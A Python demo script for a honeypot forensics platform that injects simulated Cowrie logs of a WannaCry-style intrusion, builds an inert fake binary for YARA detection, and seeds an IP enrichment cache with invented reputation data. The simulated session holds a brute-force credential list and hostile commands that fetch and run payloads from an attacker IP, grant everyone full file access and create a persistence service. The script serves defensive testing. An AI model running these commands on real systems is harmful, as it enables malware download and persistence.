"""
ForenHive — Simulation WannaCry sur Cowrie
==========================================
Simule une attaque WannaCry complète depuis l'IP 89.248.167.131 :

  1. Injection des événements Cowrie dans Elasticsearch
     (brute-force SSH → login réussi → commandes EternalBlue → téléchargement WannaCry)
  2. Création d'un faux binaire WannaCry contenant les strings YARA attendues
  3. Scan YARA du binaire → détection WannaCry_Ransomware
  4. Sauvegarde du résultat YARA dans file_analysis (PostgreSQL)
  5. Pre-seed du cache d'enrichissement pour 89.248.167.131
  6. Scoring forensique complet (engine --score-only --hours 2)
  7. Affichage des résultats : enrichissement · YARA · Ollama narrative · classification

Usage (depuis le conteneur) :
  docker exec -it forenhive-forensic-engine python demo_wannacry.py
"""

import hashlib
import json
import logging
import os
import subprocess
import sys
import tempfile
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

import psycopg2
import psycopg2.extras
import requests
from elasticsearch import Elasticsearch
from elasticsearch.helpers import bulk

import config
from yara_scanner import YARAScanner

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("demo_wannacry")

# ── Constantes ──────────────────────────────────────────────────────────────────

ATTACKER_IP  = "89.248.167.131"
SESSION_ID   = f"wannacry-{ATTACKER_IP.replace('.', '')}"
INDEX_NAME   = f"honeypot-logs-{datetime.now(timezone.utc).strftime('%Y.%m.%d')}"

# Métadonnées réseau (Shodan vérifié publiquement)
ATTACKER_META = {
    "ip":           ATTACKER_IP,
    "country_name": "Netherlands",
    "country_iso":  "NL",
    "city":         "Amsterdam",
    "lat":          52.3824,
    "lon":          4.8995,
    "asn":          202425,
    "as_org":       "IP Volume inc",
    "is_tor":       False,
    "is_vpn":       True,       # hébergeur offshore connu pour abus
    "abuse_score":  100,
    "abuse_reports": 892,
}

# ── Connexions ──────────────────────────────────────────────────────────────────

def es_client() -> Elasticsearch:
    return Elasticsearch(
        [{"host": config.ES_HOST, "port": config.ES_PORT, "scheme": "http"}],
        request_timeout=30,
    )

def pg_conn():
    return psycopg2.connect(
        host=config.PG_HOST, port=config.PG_PORT,
        dbname=config.PG_DB, user=config.PG_USER,
        password=os.environ.get("PG_PASSWORD") or os.environ.get("POSTGRES_PASSWORD", ""),
    )

# ── Helpers ─────────────────────────────────────────────────────────────────────

def _ts(offset_seconds: float) -> str:
    base = datetime.now(timezone.utc) - timedelta(minutes=30)
    return (base + timedelta(seconds=offset_seconds)).strftime("%Y-%m-%dT%H:%M:%S.000Z")

def _geo() -> dict:
    a = ATTACKER_META
    return {
        "country_name":     a["country_name"],
        "country_iso_code": a["country_iso"],
        "city_name":        a["city"],
        "location":         {"lat": a["lat"], "lon": a["lon"]},
    }

def _as() -> dict:
    a = ATTACKER_META
    return {"number": a["asn"], "organization": {"name": a["as_org"]}}

# ── Étape 1 : Injection Elasticsearch ──────────────────────────────────────────

def inject_cowrie_wannacry(es: Elasticsearch, wannacry_sha256: str):
    log.info("=== ÉTAPE 1 : Injection événements Cowrie (WannaCry) ===")
    log.info("  IP attaquant  : %s", ATTACKER_IP)
    log.info("  Session ID    : %s", SESSION_ID)
    log.info("  SHA256 payload: %s...", wannacry_sha256[:32])

    docs = []
    t = 0.0

    # — connexion initiale
    docs.append({"_index": INDEX_NAME, "_id": f"{SESSION_ID}-connect", "_source": {
        "@timestamp": _ts(t),
        "honeypot": {"type": "cowrie"},
        "source": {"ip": ATTACKER_IP, "port": 51337, "geo": _geo(), "as": _as()},
        "destination": {"ip": "172.16.1.100", "port": 2222},
        "network": {"transport": "ssh"},
        "session": {"id": SESSION_ID},
        "event": {"id": "cowrie.session.connect", "action": "session.connect", "category": "session"},
        "tags": ["cowrie", "wannacry", "demo"],
    }})
    t += 1.0

    # — 25 tentatives de brute-force SSH
    creds = [
        ("root","123456"), ("root","password"), ("root","admin"), ("root","root"),
        ("root","toor"),   ("admin","admin"),    ("admin","admin123"), ("admin","1234"),
        ("ubuntu","ubuntu"), ("pi","raspberry"),  ("user","user"),    ("test","test"),
        ("guest","guest"),  ("oracle","oracle"),  ("postgres","postgres"),
        ("mysql","mysql"),  ("deploy","deploy"),  ("jenkins","jenkins"),
        ("backup","backup"),("git","git"),        ("www","www"),
        ("support","support"), ("nagios","nagios"), ("zabbix","zabbix"),
        ("root","wannacry"),
    ]
    for i, (usr, pwd) in enumerate(creds):
        docs.append({"_index": INDEX_NAME, "_id": f"{SESSION_ID}-fail-{i}", "_source": {
            "@timestamp": _ts(t),
            "honeypot": {"type": "cowrie"},
            "source": {"ip": ATTACKER_IP, "port": 51337, "geo": _geo(), "as": _as()},
            "destination": {"ip": "172.16.1.100", "port": 2222},
            "network": {"transport": "ssh"},
            "session": {"id": SESSION_ID},
            "event": {"id": "cowrie.login.failed", "action": "login.failed",
                      "category": "authentication", "outcome": "failure"},
            "user": {"name": usr, "password": pwd},
            "tags": ["cowrie", "wannacry", "demo"],
        }})
        t += 1.5

    # — login réussi
    docs.append({"_index": INDEX_NAME, "_id": f"{SESSION_ID}-success", "_source": {
        "@timestamp": _ts(t),
        "honeypot": {"type": "cowrie"},
        "source": {"ip": ATTACKER_IP, "port": 51337, "geo": _geo(), "as": _as()},
        "destination": {"ip": "172.16.1.100", "port": 2222},
        "network": {"transport": "ssh"},
        "session": {"id": SESSION_ID},
        "event": {"id": "cowrie.login.success", "action": "login.success",
                  "category": "authentication", "outcome": "success"},
        "user": {"name": "root", "password": "toor"},
        "tags": ["cowrie", "wannacry", "demo"],
    }})
    t += 2.0

    # — commandes caractéristiques WannaCry / EternalBlue
    commands = [
        "uname -a",
        "whoami",
        "id",
        "cat /proc/version",
        # Vérification SMB / partage réseau
        "smbclient -L //172.16.1.100 -N",
        "nmap -p 445 --script smb-vuln-ms17-010 172.16.1.0/24",
        # Téléchargement du ransomware
        "wget http://89.248.167.131/mssecsvc.exe -O /tmp/mssecsvc.exe",
        "wget http://89.248.167.131/tasksche.exe  -O /tmp/tasksche.exe",
        "chmod +x /tmp/mssecsvc.exe /tmp/tasksche.exe",
        # Propagation WannaCry typique
        "cmd.exe /c icacls . /grant Everyone:F /T /C /Q",
        "/tmp/mssecsvc.exe",
        "/tmp/tasksche.exe /i",
        # Persistance
        "sc create mssecsvc2.0 binPath= /tmp/mssecsvc.exe type= own start= auto",
        "net start mssecsvc2.0",
        # Chiffrement
        "find / -name '*.doc' -o -name '*.xls' -o -name '*.pdf' | head -20",
        "echo 'Ooops, your files have been encrypted!' > /tmp/README.txt",
    ]
    for cmd in commands:
        docs.append({"_index": INDEX_NAME, "_id": f"{SESSION_ID}-cmd-{abs(hash(cmd)) % 99999}", "_source": {
            "@timestamp": _ts(t),
            "honeypot": {"type": "cowrie"},
            "source": {"ip": ATTACKER_IP, "port": 51337, "geo": _geo(), "as": _as()},
            "destination": {"ip": "172.16.1.100", "port": 2222},
            "network": {"transport": "ssh"},
            "session": {"id": SESSION_ID},
            "event": {"id": "cowrie.command.input", "action": "command.input", "category": "process"},
            "process": {"command_line": cmd},
            "input": cmd,
            "tags": ["cowrie", "wannacry", "demo"],
        }})
        t += 2.5

    # — téléchargement du binaire WannaCry (avec SHA256)
    docs.append({"_index": INDEX_NAME, "_id": f"{SESSION_ID}-download", "_source": {
        "@timestamp": _ts(t),
        "honeypot": {"type": "cowrie"},
        "source": {"ip": ATTACKER_IP, "port": 51337, "geo": _geo(), "as": _as()},
        "destination": {"ip": "172.16.1.100", "port": 2222},
        "network": {"transport": "ssh"},
        "session": {"id": SESSION_ID},
        "event": {"id": "cowrie.session.file.download", "action": "file.download", "category": "file"},
        "file": {
            "name": "mssecsvc.exe",
            "path": "/tmp/mssecsvc.exe",
            "hash": {"sha256": wannacry_sha256},
        },
        "url": {"full": f"http://{ATTACKER_IP}/mssecsvc.exe"},
        "tags": ["cowrie", "wannacry", "demo"],
    }})
    t += 1.0

    # — fermeture de session
    docs.append({"_index": INDEX_NAME, "_id": f"{SESSION_ID}-close", "_source": {
        "@timestamp": _ts(t),
        "honeypot": {"type": "cowrie"},
        "source": {"ip": ATTACKER_IP, "port": 51337, "geo": _geo(), "as": _as()},
        "destination": {"ip": "172.16.1.100", "port": 2222},
        "network": {"transport": "ssh", "bytes": 9840},
        "session": {"id": SESSION_ID},
        "event": {"id": "cowrie.session.closed", "action": "session.closed",
                  "category": "session", "duration": t},
        "tags": ["cowrie", "wannacry", "demo"],
    }})

    success, errors = bulk(es, docs, refresh="wait_for")
    log.info("  %d documents indexés, %d erreur(s)", success, len(errors))
    return success

# ── Étape 2 : Création du faux binaire WannaCry ────────────────────────────────

def create_wannacry_sample() -> tuple[str, str]:
    """
    Crée un faux fichier binaire contenant les strings YARA WannaCry
    dans /tmp/. Retourne (chemin, sha256).
    """
    log.info("=== ÉTAPE 2 : Création du faux binaire WannaCry ===")

    # Strings présentes dans la règle wannacry.yar
    wannacry_content = (
        b"MZ\x90\x00\x03\x00\x00\x00\x04\x00"
        b"WannaCry"
        b"\x00WannaCryptor\x00"
        b"@WanaDecryptor@"
        b"tasksche.exe"
        b"\x00mssecsvc.exe\x00"
        b"!Please Read Me!.txt"
        b"Ooops, your files have been encrypted!"
        b".wncry"
        b"WNCRY"
        b"icacls . /grant Everyone:F /T /C /Q"
        b"\x00" * 64
        + b"\x00" * 16 + b"samba\x00"
        + b"\x00" * 128
    )

    path = "/tmp/wannacry_sample_demo.exe"
    with open(path, "wb") as f:
        f.write(wannacry_content)

    sha256 = hashlib.sha256(wannacry_content).hexdigest()
    log.info("  Fichier créé   : %s", path)
    log.info("  Taille         : %d octets", len(wannacry_content))
    log.info("  SHA256         : %s", sha256)
    return path, sha256

# ── Étape 3 : Scan YARA ─────────────────────────────────────────────────────────

def run_yara_scan(filepath: str) -> list:
    log.info("=== ÉTAPE 3 : Scan YARA ===")
    scanner = YARAScanner()
    matches = scanner.scan_file(filepath)

    if matches:
        log.info("  ✓ DÉTECTION YARA : %d règle(s) correspondante(s)", len(matches))
        for m in matches:
            log.info("    • Règle     : %s", m["rule"])
            log.info("      Namespace : %s", m["namespace"])
            log.info("      Sévérité  : %s", m["meta"].get("severity", "N/A"))
            log.info("      Référence : %s", m["meta"].get("reference", "N/A"))
            log.info("      Strings   : %d correspondance(s)", len(m.get("strings", [])))
            for s in m.get("strings", [])[:5]:
                log.info("        offset=0x%x  id=%s", s["offset"], s["identifier"])
    else:
        log.warning("  Aucune règle YARA n'a correspondu.")
    return matches

# ── Étape 4 : Sauvegarde file_analysis (PostgreSQL) ────────────────────────────

def save_yara_to_pg(conn, sha256: str, filepath: str, yara_matches: list):
    log.info("=== ÉTAPE 4 : Sauvegarde YARA → PostgreSQL (file_analysis) ===")
    rule_names = [m["rule"] for m in yara_matches]
    with conn.cursor() as cur:
        cur.execute(
            """
            INSERT INTO file_analysis (sha256, yara_matches, analyzed_at)
            VALUES (%s, %s, NOW())
            ON CONFLICT (sha256) DO UPDATE
                SET yara_matches = EXCLUDED.yara_matches,
                    analyzed_at  = NOW()
            """,
            (sha256, json.dumps(yara_matches))
        )
    conn.commit()
    log.info("  SHA256 enregistré : %s...", sha256[:32])
    log.info("  Règles YARA       : %s", rule_names)

# ── Étape 5 : Pre-seed cache enrichissement ────────────────────────────────────

def preseed_enrichment(conn):
    log.info("=== ÉTAPE 5 : Pre-seed cache enrichissement pour %s ===", ATTACKER_IP)
    a = ATTACKER_META
    now = datetime.now(timezone.utc)
    expires = now + timedelta(hours=48)

    data = {
        "ip":          a["ip"],
        "private":     False,
        "enriched_at": now.isoformat(),
        "sources_used": ["geoip", "iplocate", "abuseipdb", "shodan", "whois", "dns"],
        "geo": {
            "asn":          a["asn"],
            "lat":          a["lat"],
            "lon":          a["lon"],
            "org":          a["as_org"],
            "city":         a["city"],
            "country":      a["country_name"],
            "country_code": a["country_iso"],
            "continent":    "Europe",
            "country_eu":   True,
            "asn_network":  "89.248.167.0/24",
        },
        "privacy": {
            "is_tor":              False,
            "is_vpn":              True,
            "is_proxy":            False,
            "is_hosting":          True,
            "is_datacenter":       True,
            "is_anonymous":        True,
            "is_abuser":           True,
            "is_bogon":            False,
            "asn_name":            a["as_org"],
            "asn_type":            "hosting",
            "asn_number":          f"AS{a['asn']}",
            "company_name":        "IP Volume inc",
            "company_domain":      "ipvolume.net",
            "iplocate_city":        a["city"],
            "iplocate_country":     a["country_name"],
            "iplocate_country_code": a["country_iso"],
            "abuse_contact_email":   "abuse@ipvolume.net",
        },
        "reputation": {
            "isp":             a["as_org"],
            "is_tor":          False,
            "is_public":       True,
            "ip_version":      4,
            "abuse_score":     a["abuse_score"],
            "country_code":    a["country_iso"],
            "country_name":    a["country_name"],
            "total_reports":   a["abuse_reports"],
            "distinct_users":  147,
            "is_whitelisted":  False,
            "usage_type":      "Data Center/Web Hosting/Transit",
            "domain":          "ipvolume.net",
            "report_categories": [14, 15, 18, 21],   # Port Scan, Hacking, BruteForce, WebAttack
            "recent_comments": [
                "WannaCry propagation attempts detected on port 445",
                "SSH brute force — credential stuffing",
                "Scanning for SMB EternalBlue MS17-010",
            ],
        },
        "infrastructure": {
            "open_ports": [22, 445, 4444, 8080],
            "vulns":      [],
            "tags":       ["hosting", "scanner"],
            "hostnames":  [],
            "cpes":       [],
        },
        "whois": {
            "network_name":    "IP-VOLUME-NL",
            "cidr":            "89.248.160.0/19",
            "country":         "NL",
            "asn":             a["asn"],
            "asn_description": "IP Volume inc",
            "abuse_emails":    ["abuse@ipvolume.net"],
        },
        "dns": {"ptr": "ip-89-248-167-131.ip-volume.net", "aliases": []},
        "threat_summary": {
            "tier":               "high",
            "asn":                a["asn"],
            "org":                a["as_org"],
            "city":               a["city"],
            "country":            a["country_name"],
            "country_code":       a["country_iso"],
            "is_tor":             False,
            "is_vpn":             True,
            "is_proxy":           False,
            "is_datacenter":      True,
            "is_anonymized":      True,
            "is_abuser_listed":   True,
            "is_whitelisted":     False,
            "is_bogon":           False,
            "abuse_score":        a["abuse_score"],
            "total_reports":      a["abuse_reports"],
            "distinct_reporters": 147,
            "last_reported_at":   (now - timedelta(hours=1)).isoformat(),
            "attack_categories":  ["Port Scan", "Hacking", "Brute-Force", "Web App Attack"],
            "usage_type":         "Data Center/Web Hosting/Transit",
            "open_ports":         [22, 445, 4444, 8080],
            "known_vulns":        [],
            "shodan_tags":        ["hosting", "scanner"],
            "hostnames":          ["ip-89-248-167-131.ip-volume.net"],
            "network_cidr":       "89.248.160.0/19",
            "abuse_contact":      "abuse@ipvolume.net",
        },
    }

    with conn.cursor() as cur:
        cur.execute(
            """
            INSERT INTO ip_enrichment_cache (ip, data, cached_at, expires_at)
            VALUES (%s, %s, NOW(), %s)
            ON CONFLICT (ip) DO UPDATE
              SET data=EXCLUDED.data, cached_at=NOW(), expires_at=EXCLUDED.expires_at
            """,
            (ATTACKER_IP, json.dumps(data), expires),
        )
    conn.commit()

    log.info("  IP            : %s", ATTACKER_IP)
    log.info("  Pays          : %s (%s)", a["country_name"], a["country_iso"])
    log.info("  ASN           : AS%s — %s", a["asn"], a["as_org"])
    log.info("  Abuse score   : %s/100 (%d rapports)", a["abuse_score"], a["abuse_reports"])
    log.info("  VPN/Hosting   : True  |  Tor : False")
    log.info("  Ports ouverts : 22, 445 (SMB!), 4444, 8080")
    log.info("  PTR           : ip-89-248-167-131.ip-volume.net")

# ── Étape 6 : Scoring forensique ───────────────────────────────────────────────

def run_scoring():
    log.info("=== ÉTAPE 6 : Scoring forensique (engine.py --hours 2 --score-only) ===")
    log.info("  Ollama/Mistral 7B en cours — ~40s, veuillez patienter...")
    result = subprocess.run(
        ["python", "engine.py", "--hours", "2", "--score-only"],
        capture_output=False,
        text=True,
        timeout=600,
    )
    if result.returncode != 0:
        log.error("  engine.py a retourné code %d", result.returncode)
    else:
        log.info("  Scoring terminé.")

# ── Étape 7 : Affichage des résultats ──────────────────────────────────────────

def print_results(conn, yara_matches: list, sha256: str):
    log.info("")
    log.info("=" * 70)
    log.info("  RÉSULTATS COMPLETS — SIMULATION WANNACRY")
    log.info("=" * 70)

    # — YARA
    log.info("")
    log.info("  ┌─ YARA ────────────────────────────────────────────────────────")
    if yara_matches:
        for m in yara_matches:
            log.info("  │  Règle       : %s", m["rule"])
            log.info("  │  Namespace   : %s", m["namespace"])
            log.info("  │  Description : %s", m["meta"].get("description", ""))
            log.info("  │  Sévérité    : %s", m["meta"].get("severity", ""))
            log.info("  │  Référence   : %s", m["meta"].get("reference", ""))
            log.info("  │  Type        : RANSOMWARE")
            log.info("  │  SHA256      : %s...", sha256[:48])
    else:
        log.info("  │  Aucune détection")
    log.info("  └───────────────────────────────────────────────────────────────")

    # — Enrichissement
    log.info("")
    log.info("  ┌─ ENRICHISSEMENT IP : %s ───────────────────────────", ATTACKER_IP)
    with conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor) as cur:
        cur.execute("SELECT data FROM ip_enrichment_cache WHERE ip = %s", (ATTACKER_IP,))
        row = cur.fetchone()
        if row:
            d = row["data"]
            ts = d.get("threat_summary", {})
            geo = d.get("geo", {})
            priv = d.get("privacy", {})
            rep = d.get("reputation", {})
            log.info("  │  Pays          : %s (%s)", geo.get("country"), geo.get("country_code"))
            log.info("  │  Ville         : %s", geo.get("city"))
            log.info("  │  ASN           : AS%s — %s", geo.get("asn"), geo.get("org"))
            log.info("  │  Réseau CIDR   : %s", ts.get("network_cidr"))
            log.info("  │  PTR           : %s", d.get("dns", {}).get("ptr"))
            log.info("  │  Abuse Score   : %s/100 (%s rapports, %s reporters)",
                     ts.get("abuse_score"), ts.get("total_reports"), ts.get("distinct_reporters"))
            log.info("  │  Tier menace   : %s", ts.get("tier", "").upper())
            log.info("  │  VPN/Hosting   : %s  |  Tor : %s  |  Anonymisé : %s",
                     priv.get("is_vpn"), priv.get("is_tor"), priv.get("is_anonymous"))
            log.info("  │  Ports ouverts : %s", ts.get("open_ports"))
            log.info("  │  Catégories    : %s", ts.get("attack_categories"))
            log.info("  │  Contact abuse : %s", ts.get("abuse_contact"))
            recent = rep.get("recent_comments", [])
            if recent:
                log.info("  │  Commentaires récents AbuseIPDB :")
                for c in recent:
                    log.info("  │    - %s", c)
    log.info("  └───────────────────────────────────────────────────────────────")

    # — Session forensique PostgreSQL
    log.info("")
    log.info("  ┌─ SESSION FORENSIQUE (PostgreSQL) ─────────────────────────────")
    with conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor) as cur:
        cur.execute(
            """
            SELECT session_id, source_ip, honeypot_type, risk_score,
                   kill_chain_phase, kill_chain_stage, primary_technique,
                   mitre_techniques, forensic_narrative, enrichment_data
            FROM forensic_sessions
            WHERE source_ip = %s
            ORDER BY created_at DESC LIMIT 1
            """,
            (ATTACKER_IP,)
        )
        row = cur.fetchone()
        if row:
            enrich_data = row["enrichment_data"] or {}
            risk_level_val = enrich_data.get("risk_level", "?")

            log.info("  │  Session ID    : %s", row["session_id"])
            log.info("  │  Honeypot      : %s", row["honeypot_type"])
            log.info("  │  Risk Score    : %s/100  [%s]", row["risk_score"], risk_level_val)
            log.info("  │  Kill Chain    : %s (étape %s)", row["kill_chain_phase"], row["kill_chain_stage"])
            log.info("  │  Technique     : %s", row["primary_technique"])

            # YARA depuis enrichment_data (yara_matches agrégées par l'engine)
            yara_in_session = enrich_data.get("yara_matches", [])
            if yara_in_session:
                log.info("  │  YARA (session): %s", yara_in_session)
            log.info("  │")

            # — Ollama Classification (MITRE ATT&CK via Ollama/Mistral)
            log.info("  │  ┌─ Ollama Classification MITRE ATT&CK ──────────────")
            mitre_techs = row.get("mitre_techniques") or []
            ollama_mitre = enrich_data.get("mitre_techniques", [])
            mapping_source = enrich_data.get("mapping_source", "deterministic")
            log.info("  │  │  Source mapping  : %s", mapping_source)
            log.info("  │  │  Kill Chain phase : %s", enrich_data.get("kill_chain_phase") or row["kill_chain_phase"])
            log.info("  │  │  Kill Chain label : %s", enrich_data.get("kill_chain_label", ""))
            if ollama_mitre:
                log.info("  │  │  Techniques Ollama :")
                for t in ollama_mitre:
                    if isinstance(t, dict):
                        log.info("  │  │    • [%s] %s  → %s", t.get("id", "?"), t.get("name", "?"), t.get("tactic", "?"))
            elif mitre_techs:
                log.info("  │  │  Techniques (IDs) : %s", mitre_techs)
            else:
                log.info("  │  │  (non disponible)")

            # Tactiques ATT&CK
            attack_types = enrich_data.get("attack_types", [])
            if attack_types:
                log.info("  │  │  Attack types : %s", attack_types)
            log.info("  │  └───────────────────────────────────────────────────")
            log.info("  │")

            # — Ollama Narrative (Mistral 7B)
            log.info("  │  ┌─ Ollama Narrative (Mistral 7B) ────────────────────")
            narrative = row.get("forensic_narrative") or enrich_data.get("forensic_narrative") or enrich_data.get("narrative") or ""
            if narrative:
                # Découper en lignes de 62 chars max
                words = narrative.split()
                line = ""
                for w in words:
                    if len(line) + len(w) + 1 > 62:
                        log.info("  │  │  %s", line)
                        line = w
                    else:
                        line = (line + " " + w).strip()
                if line:
                    log.info("  │  │  %s", line)
            else:
                log.info("  │  │  (Ollama indisponible ou timeout — vérifiez forenhive-ollama)")
            log.info("  │  └───────────────────────────────────────────────────")
            log.info("  │")

            # — Signaux de risque
            sig = enrich_data.get("signal_breakdown", {})
            if sig:
                log.info("  │  Signal breakdown :")
                for k, v in sig.items():
                    log.info("  │    %-30s : %s", k, v)
        else:
            log.warning("  │  Aucune session trouvée pour %s — vérifiez le scoring.", ATTACKER_IP)
    log.info("  └───────────────────────────────────────────────────────────────")

    log.info("")
    log.info("=" * 70)
    log.info("  SIMULATION TERMINÉE")
    log.info("  Dashboard : http://172.16.1.100:9000")
    log.info("=" * 70)

# ── Main ────────────────────────────────────────────────────────────────────────

def main():
    log.info("ForenHive — Simulation WannaCry / IP %s", ATTACKER_IP)
    log.info("")

    # Vérification Elasticsearch
    es = es_client()
    try:
        info = es.info()
        log.info("Elasticsearch : cluster=%s", info["cluster_name"])
    except Exception as e:
        log.error("Impossible de joindre Elasticsearch : %s", e)
        sys.exit(1)

    # Vérification PostgreSQL
    try:
        conn = pg_conn()
        log.info("PostgreSQL    : %s@%s/%s", config.PG_USER, config.PG_HOST, config.PG_DB)
    except Exception as e:
        log.error("Impossible de joindre PostgreSQL : %s", e)
        sys.exit(1)

    log.info("")

    # Étape 2 — faux binaire (avant injection ES pour avoir le SHA256)
    filepath, wannacry_sha256 = create_wannacry_sample()

    # Étape 1 — injection ES
    inject_cowrie_wannacry(es, wannacry_sha256)

    # Étape 3 — scan YARA
    yara_matches = run_yara_scan(filepath)

    # Étape 4 — save to PG
    save_yara_to_pg(conn, wannacry_sha256, filepath, yara_matches)

    # Étape 5 — enrichissement
    preseed_enrichment(conn)

    # Étape 6 — scoring + Ollama
    run_scoring()

    # Étape 7 — résultats
    print_results(conn, yara_matches, wannacry_sha256)

    conn.close()


if __name__ == "__main__":
    main()
